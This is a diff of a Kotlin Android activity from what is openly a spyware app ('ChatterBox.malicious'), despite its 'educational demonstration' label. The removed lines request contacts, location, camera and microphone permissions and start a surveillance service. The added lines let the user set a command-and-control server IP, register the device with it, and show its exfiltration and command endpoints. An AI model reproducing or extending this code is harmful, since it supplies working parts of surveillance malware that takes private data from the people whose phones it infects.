@@ -1,123 +1,117 @@
 package com.example.ChatterBox.malicious
 
-import android.Manifest
-import android.content.Intent
-import android.content.pm.PackageManager
 import android.os.Bundle
+import android.util.Log
 import android.widget.Button
+import android.widget.EditText
 import android.widget.TextView
+import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
 import com.example.ChatterBox.R
+import java.io.File
+import java.io.FileOutputStream
 
 /**
- * Activity for testing C2 server connectivity
+ * A test activity to verify and update the C2 server connection.
+ * 
  * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
  */
 class TestC2Activity : AppCompatActivity() {
-    
-    private val PERMISSIONS_REQUEST_CODE = 1234
-    private val requiredPermissions = arrayOf(
-        Manifest.permission.INTERNET,
-        Manifest.permission.ACCESS_NETWORK_STATE,
-        Manifest.permission.READ_CONTACTS,
-        Manifest.permission.READ_PHONE_STATE,
-        Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.ACCESS_COARSE_LOCATION,
-        Manifest.permission.CAMERA,
-        Manifest.permission.RECORD_AUDIO
-    )
+    private lateinit var c2Client: C2Client
+    private lateinit var ipEditText: EditText
+    private lateinit var statusTextView: TextView
     
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_test_c2)
         
-        // Check and request permissions
-        checkAndRequestPermissions()
+        // Initialize the C2 configuration
+        C2Config.initialize(this)
         
-        // Setup C2 connection test button
-        val testButton = findViewById<Button>(R.id.btnTestC2)
+        // Set up UI components
+        ipEditText = findViewById(R.id.ip_edit_text)
+        val updateButton: Button = findViewById(R.id.update_ip_button)
+        val testButton: Button = findViewById(R.id.test_connection_button)
+        statusTextView = findViewById(R.id.status_text_view)
+        
+        // Set the current IP in the EditText
+        ipEditText.setText(C2Config.getServerIp())
+        
+        // Initialize C2 client
+        c2Client = C2Client(this)
+        
+        // Set up button click listeners
+        updateButton.setOnClickListener {
+            updateC2ServerIP()
+        }
+        
         testButton.setOnClickListener {
-            startC2Test()
+            testC2Connection()
         }
         
-        // Setup full malicious services button
-        val startServicesButton = findViewById<Button>(R.id.btnStartServices)
-        startServicesButton.setOnClickListener {
-            startMaliciousServices()
+        // Update the status text
+        updateStatusText()
+    }
+    
+    private fun updateC2ServerIP() {
+        val newIp = ipEditText.text.toString().trim()
+        
+        if (newIp.isEmpty()) {
+            Toast.makeText(this, "Please enter a valid IP address", Toast.LENGTH_SHORT).show()
+            return
         }
         
-        // Display current C2 server configuration
-        val serverUrlTextView = findViewById<TextView>(R.id.txtServerUrl)
-        serverUrlTextView.text = "C2 Server URL: ${C2Config.SERVER_URL}\n" +
-                "Emulator URL: ${C2Config.EMULATOR_SERVER_URL}\n" +
-                "Local URL: ${C2Config.LOCAL_SERVER_URL}"
-    }
-    
-    private fun checkAndRequestPermissions() {
-        val permissionsToRequest = ArrayList<String>()
-        
-        for (permission in requiredPermissions) {
-            if (ContextCompat.checkSelfPermission(this, permission) 
-                    != PackageManager.PERMISSION_GRANTED) {
-                permissionsToRequest.add(permission)
-            }
-        }
-        
-        if (permissionsToRequest.isNotEmpty()) {
-            ActivityCompat.requestPermissions(
-                this,
-                permissionsToRequest.toTypedArray(),
-                PERMISSIONS_REQUEST_CODE
-            )
-        }
-    }
-    
-    private fun startC2Test() {
-        // Start the service with a special test action
-        val intent = Intent(this, SurveillanceService::class.java)
-        intent.action = "TEST_C2"
-        startService(intent)
-        
-        // Update status
-        val statusTextView = findViewById<TextView>(R.id.txtStatus)
-        statusTextView.text = "C2 Test started. Check Android logcat for results."
-    }
-    
-    private fun startMaliciousServices() {
-        // Start the main surveillance service
-        val intent = Intent(this, SurveillanceService::class.java)
-        startService(intent)
-        
-        // Update status
-        val statusTextView = findViewById<TextView>(R.id.txtStatus)
-        statusTextView.text = "All surveillance services started. Check Android logcat for results."
-    }
-    
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<out String>,
-        grantResults: IntArray
-    ) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        
-        if (requestCode == PERMISSIONS_REQUEST_CODE) {
-            var allGranted = true
+        try {
+            // Update the IP in the C2Config
+            C2Config.updateServerIp(newIp)
             
-            for (result in grantResults) {
-                if (result != PackageManager.PERMISSION_GRANTED) {
-                    allGranted = false
-                    break
-                }
-            }
+            // Save the IP to the file for persistence
+            val outputStream = assets.openFd("ip.cfg").createOutputStream()
+            outputStream.write(newIp.toByteArray())
+            outputStream.close()
             
-            val statusTextView = findViewById<TextView>(R.id.txtStatus)
-            if (allGranted) {
-                statusTextView.text = "All permissions granted. You can now test the C2 connection."
-            } else {
-                statusTextView.text = "Some permissions were denied. Full functionality may not be available."
+            // Update status and show success message
+            updateStatusText()
+            Toast.makeText(this, "C2 server IP updated successfully", Toast.LENGTH_SHORT).show()
+            
+            // Create a local copy of the IP file in the app's internal storage
+            // This is a workaround since we can't directly write to assets folder at runtime
+            try {
+                val file = File(filesDir, "ip.cfg")
+                val fos = FileOutputStream(file)
+                fos.write(newIp.toByteArray())
+                fos.close()
+                Log.d("TestC2Activity", "Saved IP to internal storage: ${file.absolutePath}")
+            } catch (e: Exception) {
+                Log.e("TestC2Activity", "Error saving IP to internal storage", e)
             }
+        } catch (e: Exception) {
+            Log.e("TestC2Activity", "Error updating C2 server IP", e)
+            Toast.makeText(this, "Error updating IP: ${e.message}", Toast.LENGTH_SHORT).show()
         }
+    }
+    
+    private fun testC2Connection() {
+        statusTextView.text = "Testing connection to ${C2Config.getServerUrl()}..."
+        
+        // Register with the C2 server (this will test the connection)
+        c2Client.registerDevice()
+        
+        // Show a toast indicating that the test has started
+        Toast.makeText(this, "Testing connection to C2 server...", Toast.LENGTH_SHORT).show()
+        
+        // The actual result will be displayed as a notification by the C2Client
+    }
+    
+    private fun updateStatusText() {
+        statusTextView.text = """
+            C2 Server Status:
+            
+            Current IP: ${C2Config.getServerIp()}
+            Server URL: ${C2Config.getServerUrl()}
+            Registration Endpoint: ${C2Config.getRegistrationEndpoint()}
+            Exfiltration Endpoint: ${C2Config.getExfiltrationEndpoint()}
+            Command Endpoint: ${C2Config.getCommandEndpoint()}
+        """.trimIndent()
     }
 }
